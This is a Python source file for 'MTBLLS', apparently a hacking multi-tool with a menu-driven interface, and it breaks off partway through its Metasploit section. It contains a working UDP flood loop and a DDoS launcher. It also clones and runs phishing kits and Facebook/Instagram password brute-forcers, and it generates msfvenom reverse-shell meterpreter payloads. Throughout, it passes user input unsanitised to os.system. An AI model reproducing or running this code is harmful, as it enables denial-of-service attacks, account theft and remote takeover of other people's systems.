# MTBLLS V1.50
# WINDOWS & GNU LINUX
# ┌─────────────────────────┐
# | MTBLLS V1.50            |
# └─────────────────────────┘
#
# ┌───────────────────────────────────────────────────────────────────────┐
# | THE BEST COMMAND AND TOOL AUTOMATION TOOL FOR DEBIAN AND ARCH DISTROS |
# └───────────────────────────────────────────────────────────────────────┘
#
# ┌─────────────────────────────────────────────────────────────┐
# | Some MTBLLS tools are ILLEGAL,                              |
# | use them for good and only if you know what you are doing,  |
# | the creator is not responsible for the damages.             |
# └─────────────────────────────────────────────────────────────┘
# 
# 
from colorama import Fore
import os
import socket
import random
import json
import time
from urllib.request import urlopen
import requests
import sys
computer_name=socket.gethostname()


naranja = '\x1b[38;2;235;203;139m\x1b[360m'
#os.system(f'title [MTBLLS Multi-Tool] - Connected - '+computer_name)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
load = ['.', '..', '...']
def loading(a:str, b:list):
  num = 0
  for i in range(len(b)):
    print(a + b[num], end='\r')
    num += 1
    time.sleep(1.3)

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)



def login():
    os.system('title MTBLLS [Multi-Tool] - v1.50 - github.com/SkyWtkh/MTBLLS' if os.name == 'nt' else 'clear')
    account = {"username":"mtblls", "password":"root"}

    print(Fore.RED+"""
    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗
    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║ 
    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
    ██║     ██║   ██║██║   ██║██║██║╚██╗██║
    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
                                       
    """)
    username = input("Enter the Username: ")
    password = input("Enter the Password: ")

    if username == account["username"] and password == account["password"]:
        print("Correct Password and Username! Wait 5 Seconds ...")
        time.sleep(4)
        slowprint(" MTBLLS v1.50 | [##########################################] ")
        slowprint(" MTBLLS Modules | [##########################] ")
        slowprint(" PineappleDev | [##########################] ")
        slowprint(" ..................... ")
        slowprint(" Welcome MTBLLS user ")
        slowprint(" ..................... ")
        boot()
    else:
        print("Wrong username or Password")
        print("Exiting ...")

def logo():    
    print(f'''\u001b[38;5;111m[\u001b[38;5;26mMTBLLS - [Multi-Tool] - v1.50 | Arch & Debian Version\u001b[38;5;111m]
                                            \u001b[38;5;111m  ╔╦╗╔╦╗╔╗ ╦  ╦  ╔═╗
                                            \u001b[38;5;159m  ║║║ ║ ╠╩╗║  ║  ╚═╗
                                            \u001b[38;5;195m  ╩ ╩ ╩ ╚═╝╩═╝╩═╝╚═╝ Multi-Tool\u001b[38;5;26m''')

def options():
    print(f'''                        \u001b[38;5;111m╚╦═════════════════╦═══════════════════════╦════════════════════╦╝
                        \u001b[38;5;111m ║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m DoS         \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Wireshark     \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Bruteforce \u001b[38;5;111m║  
                        \u001b[38;5;111m ║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m DDoS        \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m5\u001b[38;5;111m]\033[0;35m Etherape      \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m6\u001b[38;5;111m]\033[0;35m Metasploit\u001b[38;5;111m ║  
                        \u001b[38;5;111m ║ \u001b[38;5;111m[\033[0;35m7\u001b[38;5;111m]\033[0;35m IP-Info     \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m6\u001b[38;8;111m]\033[0;35m Phishing      \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m9\u001b[38;5;111m]\033[0;35m Nmap       \u001b[38;5;111m║
                        \u001b[38;5;111m ║ \u001b[38;5;111m[\033[0;35m10\u001b[38;5;111m]\033[0;35m Spam SMS   \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m11\u001b[38;5;111m]\033[0;35m Sherlock     \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m12\u001b[38;5;111m]\033[0;35m Sublist3r \u001b[38;5;111m║
                        \u001b[38;5;111m ║ \u001b[38;5;111m[\033[0;35m13\u001b[38;5;111m]\033[0;35m Sqlmap     \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m14\u001b[38;5;111m]\033[0;35m PineKiller   \u001b[38;5;111m║     \u001b[38;5;111m[\033[0;35m15\u001b[38;5;111m]\033[0;35m WPScan    \u001b[38;5;111m║
                        \u001b[38;5;111m╔╩═════════════════╩═══════════════════════╩════════════════════╩╗
                        \u001b[38;5;111m║    Type 'exit' to exit mtblls or 'clear' to clear console      ║
                        \u001b[38;5;111m║    MTBLLS [Multi-Tool] | V1.50 | github.com/SkyWtkh/MTBLLS     ║
                        \u001b[38;5;111m╚════════════════════════════════════════════════════════════════╝''')
                        
    


def nmap():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f'''
                                                \u001b[38;5;111m ╔╗╔╔╦╗╔═╗╔═╗
                                                \u001b[38;5;159m ║║║║║║╠═╣╠═╝
                                                \u001b[38;5;195m ╝╚╝╩ ╩╩ ╩╩\u001b[38;5;26m  
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Ping sweep              \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Full port and mac map   \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Port open map           \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║
                                        \u001b[38;5;111m╚═════════════════════════════╝''')
    while (True):
        nmap = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
        if nmap == '1' or nmap == '01':
            nmaphost1 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Host"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            sweep1 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Sweep"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            nmapsweepcommand = "nmap -sP "+nmaphost1+"/"+sweep1
            try:
                os.system(nmapsweepcommand)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

        elif nmap == '2' or nmap == '02':
            nmaphost = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Host"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            nmapmacmap = "sudo nmap -sS "+nmaphost
            try:
                os.system(nmapmacmap)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

        elif nmap == '3' or nmap == '03':
            nmaphost2 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Host"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            port2 = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Nmap-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
            openmapcommand = "nmap -p "+nmaphost2+" -sT "+port2
            try:
                os.system(openmapcommand)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif nmap == '04' or nmap == '4':
            boot()


def choice():
    while(True):
        options = str(input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# "))
        if options == '09' or options == '9':
            nmap()
        
        elif options == '01' or options == '1':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                                    \u001b[38;5;111m╔╦╗╔═╗╔═╗
                                                    \u001b[38;5;159m║║║║ ║╚═╗
                                                    \u001b[38;5;195m═╩╝╚═╝╚═╝\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Port                    \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m IP Address              \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Duration                \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Run                     \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m5\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║
                                        \u001b[38;5;111m╚═════════════════════════════╝
                                            ''')
            while (True):
                DoS = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if DoS == '1' or DoS == '01':
                    port = int(input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# "))

                elif DoS == '2' or DoS == '02':
                    ip = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                elif DoS == '3' or DoS == '03':
                    duration = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DoS-Duration"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                elif DoS == '4' or DoS == '04':
                    timeout = time.time() + float(duration)
                    sent = 0
                    while True:                  
                        if time.time() > timeout:                       
                            break
                        else:     
                            pass
                            sock.sendto(bytes,(ip,port))
                            sent = sent + 1
                            print ("sent %s packets to %s through port %s"%(sent, ip, port))

                elif DoS == '5' or DoS == '05':
                    boot()

                else:
                    print("Command not recognized")

        elif options == '04' or options == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                                \u001b[38;5;111m╔╦╗╔╦╗╔═╗╔═╗
                                                \u001b[38;5;159m ║║ ║║║ ║╚═╗
                                                \u001b[38;5;195m═╩╝═╩╝╚═╝╚═╝\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Port                    \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m IP Address              \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Turbo                   \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m4\u001b[38;5;111m]\033[0;35m Run                     \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m5\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║
                                        \u001b[38;5;111m╚═════════════════════════════╝
                                            ''')
            
            while (True):
                DDoS = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if DDoS == '1' or DDoS == '01':
                    port = int(input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# "))
                
                elif DDoS == '2' or DDoS == '02':
                    host = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                elif DDoS == '3' or DDoS == '03':
                        turbo = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"DDoS-Turbo"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                elif DDoS == '4' or DDoS == '04':
                    ddoscommand = "python3 $HOME/MTBLLS/lib/ddos.py -s "+host+" -p"+port+" -t "+turbo
                    try:
                        os.system(ddoscommand)
                    except:
                        print(Fore.RED+"ERROR!!!")
                elif DDoS == '5' or DDoS == '05':
                    boot()

        elif options == '07' or options == '7':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                                \u001b[38;5;111m╦╔═╗  ╦╔╗╔╔═╗╔═╗
                                                \u001b[38;5;159m║╠═╝  ║║║║╠╣ ║ ║
                                                \u001b[38;5;195m╩╩    ╩╝╚╝╚  ╚═╝ Type 'ip' to input ip or 'exit' to exit\u001b[38;5;26m''')
            while(True):
                ipinfo = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"IPInfo"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                if ipinfo == 'ip':
                
                    ip=input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"IP-Info-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                    url = "http://ip-api.com/json/"
                    response = urlopen(url + ip)
                    data = response.read()
                    values = json.loads(data)
                    floats = str(data)

                    print("\033[;36m"+" IP: " + values['query'])
                    print("\033[;36m"+" Status: " + values['status'])
                    print("\033[;36m"+" City: " + values['city'])
                    print("\033[;36m"+" Country: " + values['country'])
                    print("\033[;36m"+" Zip Code: " + values['zip'])
                    print("\033[;36m"+" Time Zone: " + values['timezone'])
                    print("\033[;36m"+" ISP: " + values['isp'])
                    print("\033[;36m"+" Org: " + values['org'])
                    print("\033[;36m"+" As: " + values['as'])
                    print("\033[;36m"+" Region: " + values['region'])
                    print("\033[;36m"+" Region Name: " + values['regionName'])
                    print("\033[;36m"+" Country Code: " + values['countryCode'])
                    print("\033[;36m"+" Made by GhostTD - https://github.com/SkyWtkh")
                elif ipinfo == 'exit':
                    boot()

        elif options == '02' or options == '2':
            os.system("wireshark")
                    

        elif options == '05' or options == '5':
            os.system("sudo etherape")

        elif options == '06' or options == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                             \u001b[38;5;111m╔═╗╦ ╦╦╔═╗╦ ╦╦╔╗╔╔═╗
                                             \u001b[38;5;159m╠═╝╠═╣║╚═╗╠═╣║║║║║ ╦
                                             \u001b[38;5;195m╩  ╩ ╩╩╚═╝╩ ╩╩╝╚╝╚═╝\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m ZPhisher                \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m AdvPhishing             \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while (True):
                phishing = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Phishing"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if phishing == '1' or phishing == '01':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔═╗╦ ╦╦╔═╗╦ ╦╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠═╝╠═╣║╚═╗╠═╣║║║║║ ╦
                                    \u001b[38;5;195m╩  ╩ ╩╩╚═╝╩ ╩╩╝╚╝╚═╝ ZPhisher\u001b[38;5;26m
                                \u001b[38;5;111m╔═════════════════════════════╗
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                \u001b[38;5;111m╚═════════════════════════════╝''')
                    while (True):            
                        zphisher = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Phishing-ZPhisher"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if zphisher == '01' or zphisher == '1':
                            os.chdir("lib")
                            os.chdir("phishing")
                            os.system("git clone https://github.com/htr-tech/zphisher/")
                            os.chdir("..")
                            os.chdir("..")

                        elif zphisher == '02' or zphisher == '2':
                            os.system("chmod +x $HOME/MTBLLS/lib/phishing/zphisher/zphisher.sh")
                            os.system("bash $HOME/MTBLLS/lib/phishing/zphisher/zphisher.sh")

                        elif zphisher == '03' or zphisher == '3':
                            boot()

                elif phishing == '2' or phishing == '02':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔═╗╦ ╦╦╔═╗╦ ╦╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠═╝╠═╣║╚═╗╠═╣║║║║║ ╦
                                    \u001b[38;5;195m╩  ╩ ╩╩╚═╝╩ ╩╩╝╚╝╚═╝ AdvPhishing\u001b[38;5;26m
                                \u001b[38;5;111m╔═════════════════════════════╗
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                \u001b[38;5;111m╚═════════════════════════════╝''')
                    
                    while(True):
                        adv = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Phishing-AdvPhishing"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if adv == '1' or adv == '01':
                            os.chdir("lib")
                            os.chdir("phishing")
                            os.system("git clone https://github.com/Ignitetch/AdvPhishing")
                            os.chdir("..")
                            os.system("..")

                        elif adv == '2' or adv == '02':
                            print("""
                            Select:

                            1) debian
                            2) termux
                            """)
                            select = input("> ")
                            if select == '1' or select == 'debian':
                                os.system("chmod +x $HOME/MTBLLS/lib/phishing/AdvPhishing/ *")
                                os.system("bash $HOME/MTBLLS/lib/phishing/AdvPhishing/Linux_Setup.sh")
                                os.system("bash $HOME/MTBLLS/lib/phishing/AdvPhishing/AdvPhishing.sh")

                            elif select == '2' or select == 'termux':
                                os.system("chmod +x $HOME/MTBLLS/lib/phishing/AdvPhishing/ *")
                                os.system("bash $HOME/MTBLLS/lib/phishing/AdvPhishing/Android_Setup.sh")
                                os.system("bash $HOME/MTBLLS/lib/phishing/AdvPhishing/AdvPhishing.sh")
                        elif adv == '3' or adv == '03':
                            boot()

                        else:
                            print("error")
                elif phishing == '3' or phishing == '03':
                    boot()

        elif options == '3' or options == '03':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                        \u001b[38;5;111m╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╦╔╗╔╔═╗
                                        \u001b[38;5;159m╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║║║║║ ╦
                                        \u001b[38;5;195m╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╩╝╚╝╚═╝ Tools\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m FB-Bruteforce           \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m IG-Brueforce            \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while(True):
                brute = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Bruteforcing"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if brute == '01' or brute == '1':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║║║║║ ╦
                                    \u001b[38;5;195m╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╩╝╚╝╚═╝ Facebook\u001b[38;5;26m
                                    \u001b[38;5;111m╔═════════════════════════════╗
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                    \u001b[38;5;111m╚═════════════════════════════╝''')
                    while (True):
                        fb = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Bruteforcing-Facebook"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if fb == '01' or fb == '1':
                            os.chdir("lib")
                            os.chdir("bruteforcing")
                            os.system("git clone https://github.com/IAmBlackHacker/Facebook-BruteForce")
                            os.chdir("..")
                            os.chdir("..")

                        elif fb == '02' or fb == '2':
                            os.system("python3 $HOME/MTBLLS/lib/bruteforcing/Facebook-BruteForce/fb.py")

                        elif fb == '03' or fb == '3':
                            boot()

                if brute == '02' or brute == '2':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f'''
                                    \u001b[38;5;111m╔╗ ╦═╗╦ ╦╔╦╗╔═╗╔═╗╔═╗╦═╗╔═╗╦╔╗╔╔═╗
                                    \u001b[38;5;159m╠╩╗╠╦╝║ ║ ║ ║╣ ╠╣ ║ ║╠╦╝║  ║║║║║ ╦
                                    \u001b[38;5;195m╚═╝╩╚═╚═╝ ╩ ╚═╝╚  ╚═╝╩╚═╚═╝╩╝╚╝╚═╝ Instagram\u001b[38;5;26m
                                    \u001b[38;5;111m╔═════════════════════════════╗
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                    \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                    \u001b[38;5;111m╚═════════════════════════════╝''')
                    while (True):
                        ig = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Bruteforcing-Instagram"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if ig == '1' or ig == '01':
                            os.chdir("lib")
                            os.chdir("bruteforcing")
                            os.system("git clone https://github.com/GhosTmaNHarsh/instagram")
                            os.chdir("..")
                            os.chdir("..")

                        elif ig == '2' or ig == '02':
                            os.system("python $HOME/MTBLLS/lib/bruteforcing/instagram/hackinsta.py")

                        elif ig == '3' or ig == '03':
                            boot()

                elif brute == '03' or brute == '3':
                    boot()

        elif options == '06' or options == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                            \u001b[38;5;111m╔╦╗╔═╗╔╦╗╔═╗╔═╗╔═╗╦  ╔═╗╦╔╦╗
                                            \u001b[38;5;159m║║║║╣  ║ ╠═╣╚═╗╠═╝║  ║ ║║ ║ 
                                            \u001b[38;5;195m╩ ╩╚═╝ ╩ ╩ ╩╚═╝╩  ╩═╝╚═╝╩ ╩  \u001b[38;5;26m
                                           \u001b[38;5;111m╔═════════════════════════════╗
                                           \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Payload Creator         \u001b[38;5;111m║
                                           \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                           \u001b[38;5;111m╚═════════════════════════════╝''')
            while (True):
                        metasploit = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if metasploit == '1' or metasploit == '01':
                            print("fastMeterpreter credits: https://github.com/yorkox0/fastMeterpreter")
                            print("")
                            ipmsf = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-Atacker-IP"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")

                            portmsf = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-Listener-Port"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")

                            payload = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-Payload: android/linux/windows"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")

                            filename = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-File-Name"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                            print("")
                            
                            print(Fore.RED+"IP        ==> "+ipmsf)
                            print(Fore.RED+"Port      ==> "+portmsf)
                            print(Fore.RED+"Payload   ==> "+payload)
                            print(Fore.RED+"File Name ==> "+filename)

                            if payload == 'windows':
                                print("")
                                loading("Creating a Windows Payload",load)
                                print("")
                                os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ipmsf+" LPORT="+portmsf+" -f exe >> "+filename+".exe 2>/dev/null")
                                print(Fore.RED+"Payload Saved ==> "+filename+".exe")

                                listen = input("Do you want to start the listener? [y/n] ")

                                if listen == 'y' or listen == 'Y':
                                    os.system("rm windows.rb 2>/dev/null")
                                    os.system("echo 'use exploit/multi/handler' >> windows.rb")
                                    os.system("echo 'set LHOST "+ipmsf+"' >> windows.rb")
